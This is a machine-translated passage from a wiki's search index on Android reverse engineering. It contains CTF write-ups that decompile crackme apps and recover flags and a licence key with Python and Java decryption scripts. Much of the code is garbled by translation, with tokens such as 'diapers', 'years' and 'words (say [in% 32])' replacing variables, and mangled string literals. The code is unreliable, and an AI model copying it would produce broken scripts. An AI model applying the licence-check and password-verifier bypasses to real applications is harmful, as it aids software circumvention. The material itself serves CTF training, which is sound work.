0xB3B00C4C)\n\nlibdebugjniso.so:B3B00C3C STMFD           SP!, {R4,LR}\n\nlibdebugjniso.so:B3B00C40 LDR R3, [R0]\nlibdebugjniso.so:B3B00C44 ADD             R1, PC, R1 ; unk_B3B02148\n\nlibdebugjniso.so:B3B00C48 MOV             LR, PC\n</code></pre> <p>We breakpoints at the beginning of this function, F2, and then execute the program again with F9. While watching the phone, we can see that the title of the app has changed to <code>Hello! Nativemethod</code>.</p> <p>At this point, the basic debugging steps of the so native program are over.</p> <p>Note:</p> <p>&gt; If there is an add map dialog box in the middle, click Cancel, then apply.</p>"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#precautions","title":"Precautions","text":"<ol> <li>When using the simulator to debug an apk exception, it is very likely that the application has detected whether it is running in the simulator environment, consider using a mobile phone.</li> <li>When using the real machine debugging apk, it is also possible to encounter an exception, stuck in a certain instruction, then we can manually execute this instruction, and then set the PC to the address of the next instruction.</li> </ol>"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#basic-native-program-debugging-method-2","title":"Basic native program debugging - Method 2","text":"<p>To be added.</p>"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#multithreaded-debugging","title":"Multithreaded debugging","text":""},{"location":"android/basic_reverse/dynamic/ida_native_debug/#_1","title":"\u53c2\u8003\u9605\u8bfb","text":"<ul> <li> <p>http://www.52pojie.cn/thread-554068-1-1.html</p> </li> <li> <p>https://www.kanxue.com/chm.htm?id=10296&amp;pid=node1000944</p> </li> </ul>"},{"location":"android/basic_reverse/dynamic/ida_smali_debug/","title":"IDA Dynamically debugging smali code","text":""},{"location":"android/basic_reverse/static/complex-example/","title":"Static analysis comprehensive topic","text":""},{"location":"android/basic_reverse/static/complex-example/#2017-iscc-crackone","title":"2017 ISCC Crackone","text":"<p>Using jadx to decompile, you can get the basic logic of the program as follows</p> <ul> <li>Base64 encoding the content entered by the user, then inserting <code>\\r\\n</code> at the specified length position. This does not seem to be a mess.</li> <li>The program then passes the encoded content to the check function in so. The logic of this function is as follows</li> </ul> <pre><code>  env = a1;\n\nlen = diapers;\nstr = pstr;\nv7 = malloc (full);\n  ((*env)-&gt;GetByteArrayRegion)(env, str, 0, len, v7);\n\nv8 = malloc (only +1);\nmemset (v8, 0, len + 1);\nmemcpy (v8, v7, len);\nv9 = 0;\n  for ( i = 0; ; ++i )\n\n  {\n\n--v9;\n    if ( i &gt;= len / 2 )\n\n      break;\n\nv11 = v8 [i] -5;\nv8 [i] = v8 [only + v9];\nv8 [only + v9] = v11;\n  }\n\nv8 [len] = 0;\n  v12 = strcmp(v8, \"=0HWYl1SE5UQWFfN?I+PEo.UcshU\");\n\n  free(v8);\n\n  free(v7);\n\n  return v12 &lt;= 0;\n</code></pre> <p>It is not difficult to see that the program directly performs the appropriate operation of the two halves of the string after base64. Here we can easily write the recovery code corresponding to python, as follows</p> <pre><code>import base64\n\n\n\n\n\ndef solve():\n\nans = &amp;#39;= 0HWYl1SE5UQWFfN? I + PEo.UcshU&amp;#39;\nlength = len (ans)\n    flag = [0] * length\n\n\n\nbeg = 0\n    end = length\n\n    while beg &lt; length / 2:\n\n        end -= 1\n\nflag [beg] = chr (word (ans [end]) + 5)\nflag [end] = ans [beg]\nbeg + = 1\n    flag = ''.join(flag)\n\n    print base64.b64decode(flag)\n\nif __name__ == \"__main__\":\n\n    solve()\n</code></pre> <p>The corresponding results are as follows</p> <pre><code>\u279c  2017ISCC python exp.py\n\nflag{ISCCJAVANDKYXX}\n</code></pre>"},{"location":"android/basic_reverse/static/complex-example/#2017-njctf-easycrack","title":"2017 NJCTF easycrack","text":"<p>Through simple reverse, you can find that the basic logic of the program is as follows</p> <ol> <li>Monitor the interface text box and call the native <code>parseText</code> function if the text box content changes.</li> <li>The main functions of <code>parseText</code> are as follows</li> <li>First call the java layer function messageMe to get a string mestr. The logic of this function is basically</li> <li>XOR each of the strings after the last <code>.</code> of packagename in sequence, and stitch the results together.</li> <li>Then use the mestr length as the period to XOR the two, the core logic `str[i + j] = mestr[j] ^ iinput[i + j];</li> <li>Next, use <code>I_am_the_key</code> as the key, encrypt the part with RC4 encryption, and compare the result with the final <code>compare</code>. The basis for guessing here is as follows</li> <li>There are 256 keywords in the init function, and basically the initialization process of the RC4 key.</li> <li>The crypt function is obviously an RC4 encryption function, which is obviously the cryptographic logic of RC4.</li> </ol> <p>The decryption script is as follows</p> <pre><code>from Crypto.Cipher import ARC4\n\n\n\ndef messageme ():\n    name = 'easycrack'\n\n    init = 51\n\nans = &amp;quot;&amp;quot;\n    for c in name:\n\ninit = ord (c) ^ init\nyears + = chr (init)\nreturn years\n\n\ndef decrypt(cipher,key):\n\n    plain =\"\"\n\n    for i in range(0,len(cipher),len(key)):\n\n        tmp = cipher[i:i+len(key)]\n\n        plain +=''.join(chr(ord(tmp[i])^ord(key[i])) for i in range(len(tmp)))\n\n    return plain\n\n\n\ndef main():\n\n    rc4 = ARC4.new('I_am_the_key')\n\n    cipher = 'C8E4EF0E4DCCA683088134F8635E970EEAD9E277F314869F7EF5198A2AA4'\n\n    cipher = ''.join(chr(int(cipher[i:i+2], 16)) for i in range(0, len(cipher), 2))\n\n    middleplain = rc4.decrypt(cipher)\n\nmestr = messageme ()\n    print decrypt(middleplain,mestr)\n\n\n\n\n\nif __name__ == '__main__':\n\n    main()\n</code></pre> <p>Results are as follows</p> <pre><code>\u279c  2017NJCTF-easycrack python exp.py \n\nIt_s_a_easyCrack_for_beginners\n\n\u279c  2017NJCTF-easycrack \n</code></pre>"},{"location":"android/basic_reverse/static/complex-example/#2018-picture-lock","title":"2018 \u5f3a\u7f51\u676f picture lock","text":"<p>After simple analysis, it is found that this is an image encryption program: the java layer is the first file name of the native layer under image/, and the name of the image file that you want to encrypt, including the md5 of the signature of the corresponding apk.</p> <p>Now we can analyze the native layer code. Since the program is obviously an encryption program, we can use IDA's findcrypto plugin to identify it. The result is that the S box is found, and basically it is the AES encryption process. It can be basically determined that the main body of the program is an AES encryption. After careful analysis, the basic flow of the native layer program can be found as follows:</p> <ol> <li>Split the md5 string of the incoming signature into two halves to generate two sets of keys.</li> <li>Read md5sig[i%32] size each time</li> <li>Decide which set of keys to use based on the size of the read in</li> <li>Odd uses the second set of keys</li> <li>Use the first set of keys evenly</li> <li>If the size of the read is not enough, it will be padded with insufficient size (for example, when the size is 12, fill 4 0x4)</li> <li>At this time, the modified content must be 16 bytes, and the first 16 bytes are AES encrypted. For the following bytes, it is XORed with md5sig[i%32].</li> </ol> <p>Since we know the encryption algorithm, it is very easy to reverse, we can first get the signature md5, as follows</p> <pre><code>\u279c  picturelock keytool -list -printcert -jarfile picturelock.apk\n\nSigner #1:\n\n\nsignature:\n\n\nOwner: CN=a, OU=b, O=c, L=d, ST=e, C=ff\nPublisher: CN=a, OU=b, O=c, L=d, ST=e, C=ff\nSerial number: 5f4e6be1\nValid for Fri Sep 09 14:32:36 CST 2016 to Tue Sep 03 14:32:36 CST 2041\nCertificate fingerprint:\nMD5: F8: C4: 90: 56: E4: CC: F9: A1: 1E: 09: 0E: AF: 47: 1F: 41: 8D\nSHA1: 48: E7: 04: 5E: E6: 0D: 9D: 8A: 25: 7C: 52: 75: E5: 65: 06: 09: A5: CC: A1: 3E\nSHA256: BA: 12: C1: 3F: D6: 0E: 0D: EF: 17: AE: 3A: AD: 5D: 6E: 86: 87: 0C: 8E: 38\nSignature Algorithm Name: SHA256withRSA\nSubject public key algorithm: 2048-bit RSA key\nVersion: 3\n\n\nExtension:\n\n\n#1: ObjectId: 2.5.29.14 Criticality=false\n\nSubjectKeyIdentifier [\n\nKeyIdentifier [\n0000: 71 A3 2A FB D3 F4 A9 A9   2A 74 3F 29 8E 67 8A EA  q.*.....*t?).g..\n\n0010: 3B DD 30 E3                                        ;.0.\n\n]\n\n]\n\n\u279c  picturelock md5value=F8:C4:90:56:E4:CC:F9:A1:1E:09:0E:AF:47:1F:41:8D\n\n\u279c  picturelock echo $md5value | sed 's/://g' | tr '[:upper:]' '[:lower:]'\n\nf8c49056e4ccf9a11e090eaf471f418d\n</code></pre> <p>Then we can use the existing AES library to decrypt directly</p> <pre><code>#!/usr/bin/env python\n\n\n\nimport itertools\n\n\n\nsig = &amp;#39;f8c49056e4ccf9a11e090eaf471f418d&amp;#39;\n\n\nfrom Crypto.Cipher import AES\n\n\n\ndef decode_sig(payload):\n\nans = &amp;quot;&amp;quot;\n    for i in range(len(payload)):\n\nans + = chr (words (payload [i]) ^ words (sig [(16 + i)% 32]))\nreturn years\n\n\ndef dec_aes():\n\n    data = open('flag.jpg.lock', 'rb').read()\n\njpg_data = &amp;#39;&amp;#39;\n    f = open('flag.jpg', 'wb')\n\n    idx = 0\n\n    i = 0\n\n    cipher1 = AES.new(sig[:0x10])\n\n    cipher2 = AES.new(sig[0x10:])\n\n    while idx &lt; len(data):\n\nread_len = words (say [in% 32])\n        payload = data[idx:idx+read_len]\n\n        #print('[+] Read %d bytes' % read_len)\n\n        print('[+] Totally %d / %d bytes, sig index : %d' % (idx, len(data), i))\n\n\n\n        if read_len % 2 == 0:\n\n            f.write(cipher1.decrypt(payload[:0x10]))\n\n        else:\n\n            f.write(cipher2.decrypt(payload[:0x10]))\n\n        f.write(decode_sig(payload[16:]))\n\n        f.flush()\n\n        idx += read_len\n\n        i += 1\n\n    print('[+] Decoding done ...')\n\n    f.close()\n\n\n\ndec_aes()\n</code></pre> <p>Finally, you can get the result of a picture decryption, which contains the flag.</p>"},{"location":"android/basic_reverse/static/java-example/","title":"static analysis java layer example","text":""},{"location":"android/basic_reverse/static/java-example/#2014-tinyctf-ooooooh-what-does-this-button-do","title":"2014 tinyCTF Ooooooh! What does this button do","text":""},{"location":"android/basic_reverse/static/java-example/#determining-the-file-type","title":"Determining the file type","text":"<p>Through the linux file command, you can see that the file is a compressed package. Unzip it and find that it is actually an apk file.</p>"},{"location":"android/basic_reverse/static/java-example/#install-apk","title":"Install apk","text":"<p>After installing the file, check it out.</p> <p></p> <p>It can be seen that it is to enter a string, and then the result should pop up.</p>"},{"location":"android/basic_reverse/static/java-example/#viewing-the-program","title":"Viewing the program","text":"<pre><code>    class C00721 implements OnClickListener {\n\n        C00721() {\n\n        }\n\n\n\n        public void onClick(View view) {\n\n            if (((EditText) MainActivity.this.findViewById(C0073R.id.passwordField)).getText().toString().compareTo(\"EYG3QMCS\") == 0) {\n\n                MainActivity.this.startActivity(new Intent(MainActivity.this, FlagActivity.class));\n\n            }\n\n        }\n\n    }\n</code></pre> <p>In the main program, you can find that if we enter the string EYG3QMCS will execute flagActivity.class. Then we can enter the following results.</p> <p></p> <p>That is, get the flag.</p>"},{"location":"android/basic_reverse/static/java-example/#2014-asis-cyber-security-contest-finals-numdroid","title":"2014 ASIS Cyber Security Contest Finals Numdroid","text":""},{"location":"android/basic_reverse/static/java-example/#judging-file-type","title":"Judging file type","text":"<p>First use file to determine the file type, found that it is a compressed package, unzip it, get the corresponding file, and then continue to look at it, found that the file is an apk file.</p>"},{"location":"android/basic_reverse/static/java-example/#installer","title":"Installer","text":"<p>Install the program. A quick look at the page, you can find that the program is mainly to enter a password, and then log in. If you make a mistake, the message \"Wrong Password\" will pop up.</p> <p></p>"},{"location":"android/basic_reverse/static/java-example/#_1","title":"\u5206\u6790\u7a0b\u5e8f","text":"<p>Locate the key functions in the source program based on the corresponding string. According to strings.xml, we can find the variable name of the string is wrong, and then we found the following code.</p> <pre><code>    protected void ok_clicked() {\n\n        DebugTools.log(\"clicked password: \" + this.mScreen.getText());\n\n        boolean result = Verify.isOk(this, this.mScreen.getText().toString());\n\n        DebugTools.log(\"password is Ok? : \" + result);\n\n        if (result) {\n\n            Intent i = new Intent(this, LipSum.class);\n\n            Bundle b = new Bundle();\n\n            b.putString(\"flag\", this.mScreen.getText().toString().substring(0, 7));\n\n            i.putExtras(b);\n\n            startActivity(i);\n\n            return;\n\n        }\n\n        Toast.makeText(this, R.string.wrong, 1).show();\n\n        this.mScreen.setText(\"\");\n\n    }\n</code></pre> <p>Continue to locate in Verify.isOk. as follows</p> <pre><code>    public static boolean isOk(Context c, String _password) {\n\n        String password = _password;\n\n        if (_password.length() &gt; 7) {\n\n            password = _password.substring(0, 7);\n\n        }\n\n        String r = OneWayFunction(password);\n\n        DebugTools.log(\"digest: \" + password + \" =&gt; \" + r);\n\n        if (r.equals(\"be790d865f2cea9645b3f79c0342df7e\")) {\n\n            return true;\n\n        }\n\n        return false;\n\n    }\n</code></pre> <p>It can be found that the program mainly takes the first 7 bits of the password for OneWayFunction encryption, and then compares it with be790d865f2cea9645b3f79c0342df7e. Returns true if they are equal. Here we look at OneWayFunction again, as follows</p> <pre><code>    private static String OneWayFunction(String password) {\n\n        List&lt;byte[]&gt; bytes = ArrayTools.map(ArrayTools.select(ArrayTools.map(new String[]{\"MD2\", \"MD5\", \"SHA-1\", \"SHA-256\", \"SHA-384\", \"SHA-512\"}, new AnonymousClass1(password)), new SelectAction&lt;byte[]&gt;() {\n\n            public boolean action(byte[] element) {\n\n                return element != null;\n\n            }\n\n        }), new MapAction&lt;byte[], byte[]&gt;() {\n\n            public byte[] action(byte[] element) {\n\n                int i;\n\n                byte[] b = new byte[8];\n\n                for (i = 0; i &lt; b.length / 2; i++) {\n\n                    b[i] = element[i];\n\n                }\n\n                for (i = 0; i &lt; b.length / 2; i++) {\n\n                    b[(b.length / 2) + i] = element[(element.length - i) - 2];\n\n                }\n\n                return b;\n\n            }\n\n        });\n\n        byte[] b2 = new byte[(bytes.size() * 8)];\n\n        for (int i = 0; i &lt; b2.length; i++) {\n\n            b2[i] = ((byte[]) bytes.get(i % bytes.size()))[i / bytes.size()];\n\n        }\n\n        try {\n\n            MessageDigest digest = MessageDigest.getInstance(\"MD5\");\n\n            digest.update(b2);\n\n            byte[] messageDigest = digest.digest();\n\n            StringBuilder hexString = new StringBuilder();\n\n            for (byte aMessageDigest : messageDigest) {\n\n                String h = Integer.toHexString(aMessageDigest &amp; MotionEventCompat.ACTION_MASK);\n\n                while (h.length() &lt; 2) {\n\n                    h = \"0\" + h;\n\n                }\n\n                hexString.append(h);\n            }\n\n            return hexString.toString();\n\n        } catch (NoSuchAlgorithmException e) {\n\n            return \"\";\n\n        }\n\n    }\n</code></pre> <p>The function probably executes several hash values, but if you analyze it yourself, it is too complicated. Because the answer space (10^7) of this question is relatively small, we can take the method in the verify class and violently run it. .</p>"},{"location":"android/basic_reverse/static/java-example/#constructor","title":"Constructor","text":"<p>After extracting the java program, add the main function to the Verify class and fix some errors to get the corresponding answer.</p> <p>The corresponding code here is placed in the folder corresponding to example.</p> <p>It should be noted that if the corresponding hash function does not exist, the source program will skip the corresponding function. I ran all without finding it, then removed an unusual MD2 algorithm and got the answer. This shows that android should be without the md2 algorithm.</p> <p>After input, you get the following</p> <p></p> <p>Then we calculate the corresponding MD value, so that the flag is ASIS_3c56e1ed0597056fef0006c6d1c52463.</p>"},{"location":"android/basic_reverse/static/java-example/#2014-sharif-university-quals-ctf-commercial-application","title":"2014 Sharif University Quals CTF Commercial Application","text":""},{"location":"android/basic_reverse/static/java-example/#installer_1","title":"Installer","text":"<p>First, install the program, just click the button, click on the button in the upper right will let us enter the key</p> <p></p> <p>Just enter it and find that the program reports an error directly, telling us that it is wrong, then we can use this information to locate the key code.</p> <p></p>"},{"location":"android/basic_reverse/static/java-example/#positioning-key-code","title":"Positioning key code","text":"<pre><code>    public static final String NOK_LICENCE_MSG = \"Your licence key is incorrect...! Please try again with another.\";\n\n    public static final String OK_LICENCE_MSG = \"Thank you, Your application has full licence. Enjoy it...!\";\n\n\n\n    private void checkLicenceKey(final Context context) {\n\n        if (this.app.getDataHelper().getConfig().hasLicence()) {\n\n            showAlertDialog(context, OK_LICENCE_MSG);\n\n            return;\n\n        }\n\n        View inflate = LayoutInflater.from(context).inflate(C0080R.layout.propmt, null);\n\n        Builder builder = new Builder(context);\n\n        builder.setView(inflate);\n\n        final EditText editText = (EditText) inflate.findViewById(C0080R.id.editTextDialogUserInput);\n\n        builder.setCancelable(false).setPositiveButton(\"Continue\", new OnClickListener() {\n\n            public void onClick(DialogInterface dialogInterface, int i) {\n\n                if (KeyVerifier.isValidLicenceKey(editText.getText().toString(), MainActivity.this.app.getDataHelper().getConfig().getSecurityKey(), MainActivity.this.app.getDataHelper().getConfig().getSecurityIv())) {\n\n                    MainActivity.this.app.getDataHelper().updateLicence(2014);\n\n                    MainActivity.isRegisterd = true;\n\n                    MainActivity.this.showAlertDialog(context, MainActivity.OK_LICENCE_MSG);\n\n                    return;\n\n                }\n\n                MainActivity.this.showAlertDialog(context, MainActivity.NOK_LICENCE_MSG);\n\n            }\n\n}). setNegativeButton (&amp;quot;Cancel&amp;quot;, new C00855 ());\n        builder.create().show();\n\n    }\n</code></pre> <p>We found that, in fact, MainActivity.NOK_LICENCE_MSG stores the error string information, and then continue to read the discovery program.</p> <pre><code>KeyVerifier.isValidLicenceKey(editText.getText().toString(), MainActivity.this.app.getDataHelper().getConfig().getSecurityKey(), MainActivity.this.app.getDataHelper().getConfig().getSecurityIv())\n</code></pre> <p>To verify, if the verification is passed, the success message will be displayed.</p>"},{"location":"android/basic_reverse/static/java-example/#detailed-analysis","title":"Detailed analysis","text":"<p>Then we carefully analyze these three parameters.</p>"},{"location":"android/basic_reverse/static/java-example/#parameter-1","title":"Parameter 1","text":"<p>Parameter 1 is actually the string we entered.</p>"},{"location":"android/basic_reverse/static/java-example/#parameter-2","title":"Parameter 2","text":"<p>Is to use the function to get the getSecurityKey, we simply read, you can find that the program set the SecurityKey in the getConfig function</p> <pre><code>    public AppConfig getConfig() {\n\nboolean z = false;\n        AppConfig appConfig = new AppConfig();\n\n        Cursor rawQuery = this.myDataBase.rawQuery(SELECT_QUERY, null);\n\n        if (rawQuery.moveToFirst()) {\n\nappConfig.setId (rawQuery.getInt (0));\n            appConfig.setName(rawQuery.getString(1));\n\n            appConfig.setInstallDate(rawQuery.getString(2));\n\nif (rawQuery.getInt (3)&amp;gt; 0) {\nz = true;\n            }\n\n            appConfig.setValidLicence(z);\n\n            appConfig.setSecurityIv(rawQuery.getString(4));\n\n            appConfig.setSecurityKey(rawQuery.getString(5));\n\n            appConfig.setDesc(rawQuery.getString(7));\n\n        }\n\n        return appConfig;\n\n    }\n</code></pre> <p>Among them, the function first accessed the database, SELECT_QUERY is as follows</p> <pre><code>    private static String DB_NAME = \"db.db\";\n\n    private static String DB_PATH = \"/data/data/edu.sharif.ctf/databases/\";\n\n    public static final String SELECT_QUERY = (\"SELECT  * FROM \" + TABLE_NAME + \" WHERE a=1\");\n\n    private static String TABLE_NAME = \"config\";\n</code></pre> <p>At the same time, we can get the path to the database.</p> <p>In further analysis, we can find that the program first gets the first line of the table config here, then sets iv to the value of the fourth column, and the key is set to the value of the fifth column.</p> <pre><code>            appConfig.setSecurityIv(rawQuery.getString(4));\n\n            appConfig.setSecurityKey(rawQuery.getString(5));\n</code></pre>"},{"location":"android/basic_reverse/static/java-example/#parameter-3","title":"Parameter 3","text":"<p>In fact, parameter 3 is similar to parameter 2. I won't explain it here.</p>"},{"location":"android/basic_reverse/static/java-example/#getting-the-database-file","title":"Getting the database file","text":"<p>First, we need to install the apk file on the phone, and then use the following command to get</p> <pre><code>adb pull /data/data/edu.sharif.ctf/databases/db.db\n</code></pre> <p>Then use the computer to view the sqlite software to check it, here I am using http://sqlitebrowser.org/ . as follows</p> <p></p> <p>Here we can get it directly</p> <pre><code>SecurityIv=a5efdbd57b84ca36\n\nSecurityKey=37eaae0141f1a3adf8a1dee655853714\n</code></pre>"},{"location":"android/basic_reverse/static/java-example/#analyze-encrypted-code","title":"Analyze encrypted code","text":"<pre><code>public class KeyVerifier {\n\n    public static final String CIPHER_ALGORITHM = \"AES/CBC/PKCS5Padding\";\n\n    public static final String VALID_LICENCE = \"29a002d9340fc4bd54492f327269f3e051619b889dc8da723e135ce486965d84\";\n\n\n\n    public static String bytesToHexString(byte[] bArr) {\n\n        StringBuilder stringBuilder = new StringBuilder();\n\n        int length = bArr.length;\n\n        for (int i = 0; i &lt; length; i++) {\n\n            stringBuilder.append(String.format(\"%02x\", new Object[]{Integer.valueOf(bArr[i] &amp; 255)}));\n\n        }\n\n        return stringBuilder.toString();\n\n    }\n\n\n\n    public static String encrypt(String str, String str2, String str3) {\n\n        String str4 = \"\";\n\n        try {\n\n            Key secretKeySpec = new SecretKeySpec(hexStringToBytes(str2), \"AES\");\n\n            Cipher instance = Cipher.getInstance(CIPHER_ALGORITHM);\n\n            instance.init(1, secretKeySpec, new IvParameterSpec(str3.getBytes()));\n\n            str4 = bytesToHexString(instance.doFinal(str.getBytes()));\n\n        } catch (Exception e) {\n\ne.printStackTrace ();\n        }\n\n        return str4;\n\n    }\n\n\n\n    public static byte[] hexStringToBytes(String str) {\n\n        int length = str.length();\n\n        byte[] bArr = new byte[(length / 2)];\n\n        for (int i = 0; i &lt; length; i += 2) {\n\n            bArr[i / 2] = (byte) ((Character.digit(str.charAt(i), 16) &lt;&lt; 4) + Character.digit(str.charAt(i + 1), 16));\n\n        }\n\n        return bArr;\n\n    }\n\n\n\n    public static boolean isValidLicenceKey(String str, String str2, String str3) {\n\n        return encrypt(str, str2, str3).equals(VALID_LICENCE);\n\n    }\n\n}\n</code></pre> <p>You can see that the program first uses the encrypt function to encrypt the three strings. In fact, it is encrypted by the AES/CBC/PKCS5Padding method mentioned above, with str2 as the key and str3 as the initial vector. Then we can easily add the decryption function as follows</p> <pre><code>    public static String decrypt(String input, String secretKey, String iv) {\n\n        String encryptedText = \"\";\n\n        try {\n\n            SecretKeySpec secretKeySpec = new SecretKeySpec(hexStringToBytes(secretKey), \"AES\");\n\n            Cipher cipher = Cipher.getInstance(CIPHER_ALGORITHM);\n\n            cipher.init(2, secretKeySpec, new IvParameterSpec(iv.getBytes()));\n\n            encryptedText = bytesToHexString(cipher.doFinal(hexStringToBytes(userInput)));\n\n        } catch (Exception e) {\n\ne.printStackTrace ();\n        }\n\n        return encryptedText;\n\n    }\n</code></pre> <p>Then run the product key that gets the normal input</p> <pre><code>fl ag-IS-see-ri-al-NU-MB-ER\n</code></pre>"},{"location":"android/basic_reverse/static/java-example/#2015-0ctf-fiber","title":"2015-0CTF fiber","text":""},{"location":"android/basic_reverse/static/java-example/#analysis","title":"Analysis","text":"<p>First, analyze the code as follows</p> <pre><code>public void confirm(View v) {\n\n    if(\"0CTF{\" + String.valueOf(this.getSig(this.getPackageName())) + this.getCrc() + \"}\".equals(\n\n            this.et.getText().toString())) {\n\n        Toast.makeText(((Context)this), \"Yes!\", 0).show();\n\n    }\n\n    else {\n\n        Toast.makeText(((Context)this), \"0ops!\", 0).show();\n\n    }\n\n}\n\n\n\nprivate String getCrc() {\n\n    String v1;\n\n    try {\n\n        v1 = String.valueOf(new ZipFile(this.getApplicationContext().getPackageCodePath()).getEntry(\n\n                \"classes.dex\").getCrc());\n\n    }\n\n    catch(Exception v0) {\n\nv0.printStackTrace ();\n    }\n\n\n\n    return v1;\n\n}\n\n\n\nprivate int getSig(String packageName) {\n\nint v4;\n    PackageManager v2 = this.getPackageManager();\n\n    int v5 = 64;\n\n    try {\n\n        v4 = v2.getPackageInfo(packageName, v5).signatures[0].toCharsString().hashCode();\n\n    }\n\n    catch(Exception v0) {\n\nv0.printStackTrace ();    }\n\n\n\nreturn v4;\n}\n</code></pre> <p>It can be seen that the flag we want is divided into two parts.</p> <ul> <li> <p>String.valueOf(this.getSig(this.getPackageName()))</p> </li> <li> <p>this.getCrc()</p> </li> </ul> <p>In the first part, we can write an app to get the corresponding value. In the second part, we can extract the dex file directly and use the online tools to calculate it.</p>"},{"location":"android/basic_reverse/static/java-example/#hashcode","title":"hashcode","text":"<p>Just find one (put in the corresponding example folder)</p> <pre><code>package com.iromise.getsignature;\n\n\nimport android.content.pm.PackageInfo;\n\nimport android.content.pm.PackageManager;\n\nimport android.content.pm.Signature;\n\nimport android.support.v7.app.AppCompatActivity;\n\nimport android.os.Bundle;\n\nimport android.text.TextUtils;\n\nimport android.util.Log;\n\nimport android.widget.Toast;\n\n\n\npublic class MainActivity extends AppCompatActivity {\n\n\n\n    private StringBuilder builder;\n\n\n\n    public void onCreate(Bundle savedInstanceState) {\n\nsuper.onCreate (savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        PackageManager manager = getPackageManager();\n\n        builder = new StringBuilder();\n\nString pkgname = &amp;quot;com.ctf. fiber&amp;quot;;\n        boolean isEmpty = TextUtils.isEmpty(pkgname);\n\n        if (isEmpty) {\n\nToast.makeText(this, &amp;quot;The application&amp;#39;s package name cannot be empty!&amp;quot;, Toast.LENGTH_SHORT);\n        } else {\n\n            try {\n\n                PackageInfo packageInfo = manager.getPackageInfo(pkgname, PackageManager.GET_SIGNATURES);\n\n                Signature[] signatures = packageInfo.signatures;\n\n                Log.i(\"hashcode\", String.valueOf(signatures[0].toCharsString().hashCode()));\n\n} catch (PackageManager.NameNotFoundException e)\ne.printStackTrace ();\n            }\n\n        }\n\n    }\n\n}\n</code></pre> <p>Then filter out the hashcode in ddms</p> <pre><code>07-18 11:05:11.895 16124-16124/? I/hashcode: -183971537\n</code></pre> <p>**Note: In fact, this program can be written as a small app, many programs will calculate the signature. **</p>"},{"location":"android/basic_reverse/static/java-example/#classesdex-crc32","title":"classes.dex crc32","text":"<p>Just find an online website to get the CRC32 value of <code>classes.dex</code>.</p> <pre><code>CRC-32 46e26557\nMD5 Hash    3217b0ad6c769233ea2a49d17885b5ba\n\nSHA1 Hash   ec3b4730654248a02b016d00c9ae2425379bf78f\n\nSHA256 Hash 6fb1df4dacc95312ec72d8b79d22529e1720a573971f866bbf8963b01499ecf8\n</code></pre> <p>It should be noted that this needs to be converted to decimal</p> <pre><code>&gt;&gt;&gt; print int(\"46E26557\", 16)\n\n1189242199\n</code></pre>"},{"location":"android/basic_reverse/static/java-example/#flag","title":"flag","text":"<p>After the two parts are finished, it is Flag.</p> <p>Flag\uff1a0ctf{-1839715371189242199}</p>"},{"location":"android/basic_reverse/static/java-example/#2017-xman-hellosmali2","title":"2017 XMAN HelloSmali2","text":"<p>Give a smali file, we can do the following ideas</p> <p>Smali is assembled into a dex file using smali.jar.</p> <pre><code>java -jar smali.jar assemble  src.smali -o src.dex\n</code></pre> <p>Decompile dex with jadx, as follows</p> <pre><code>package com.example.hellosmali.hellosmali;\n\n\n\npublic class Digest {\n\n    public static boolean check(String input) {\n\n        String str = \"+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\";\n\n        if (input == null || input.length() == 0) {\n\n            return false;\n\n        }\n\n        int i;\n\n        char[] charinput = input.toCharArray();\n\n        StringBuilder v2 = new StringBuilder();\n\nfor (char toBinaryString: charinput) {\n            String intinput = Integer.toBinaryString(toBinaryString);\n\n            while (intinput.length() &lt; 8) {\n\n                intinput = \"0\" + intinput;\n\n            }\n\n            v2.append(intinput);\n\n        }\n\n        while (v2.length() % 6 != 0) {\n\n            v2.append(\"0\");\n\n        }\n\n        String v1 = String.valueOf(v2);\n\n        char[] v4 = new char[(v1.length() / 6)];\n\n        for (i = 0; i &lt; v4.length; i++) {\n\n            int v6 = Integer.parseInt(v1.substring(0, 6), 2);\n\n            v1 = v1.substring(6);\nv4 [i] = str.charAt (v6);\n        }\n\n        StringBuilder v3 = new StringBuilder(String.valueOf(v4));\n\n        if (input.length() % 3 == 1) {\n\n            v3.append(\"!?\");\n\n        } else if (input.length() % 3 == 2) {\n\n            v3.append(\"!\");\n\n        }\n\n        if (String.valueOf(v3).equals(\"xsZDluYYreJDyrpDpucZCo!?\")) {\n\n            return true;\n\n        }\n\n        return false;\n\n    }\n\n}\n</code></pre> <p>A quick look, in fact, is a variant of base64 encryption, we can find a base64 encoding on the Internet, and then set it up, the script used here is from http://www.cnblogs.com/crazyrunning/p/7382693. Html.</p> <pre><code>#coding=utf8\n\nimport string\n\n\n\nbase64_charset = '+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'\n\n\n\n\n\n\n\n\n\ndef decode(base64_str):\n\n    \"\"\"\n\nDecode base64 string\n:param base64_str:base64 string\n:return: the decoded bytearray; if the input parameter is not a legal base64 string, return an empty bytearray\n    \"\"\"\n\n# Subscript index for each base64 character and convert it to 6 as a binary string\n    base64_bytes = ['{:0&gt;6}'.format(str(bin(base64_charset.index(s))).replace('0b', '')) for s in base64_str if\n\n                    s != '=']\n\n    resp = bytearray()\n\nnums = len (base64_bytes) // 4\n    remain = len(base64_bytes) % 4\n\n    integral_part = base64_bytes[0:4 * nums]\n\n\n\n    while integral_part:\n\n# Take 4 6-bit base64 characters as 3 bytes\n        tmp_unit = ''.join(integral_part[0:4])\n\n        tmp_unit = [int(tmp_unit[x: x + 8], 2) for x in [0, 8, 16]]\n\n        for i in tmp_unit:\n\n            resp.append(i)\n\n        integral_part = integral_part[4:]\n\n\n\n    if remain:\n\n        remain_part = ''.join(base64_bytes[nums * 4:])\n\n        tmp_unit = [int(remain_part[i * 8:(i + 1) * 8], 2) for i in range(remain - 1)]\n\n        for i in tmp_unit:\n\n            resp.append(i)\n\n\n\n    return resp\n\n\n\nif __name__==\"__main__\":\n\n    print decode('A0NDlKJLv0hTA1lDAuZRgo==')\n</code></pre> <p>Results are as follows</p> <pre><code>\u279c  tmp python test.py\n\neM_5m4Li_i4_Ea5y\n</code></pre>"},{"location":"android/basic_reverse/static/java-example/#topic","title":"topic","text":"<ul> <li>GCTF 2017 Android1</li> <li> <p>GCTF 2017 Android2</p> </li> <li> <p>ISG 2017 Crackme</p> </li> <li>XMAN 2017 mobile3 rev1</li> </ul>"},{"location":"android/basic_reverse/static/so-example/","title":"Static analysis of the native layer 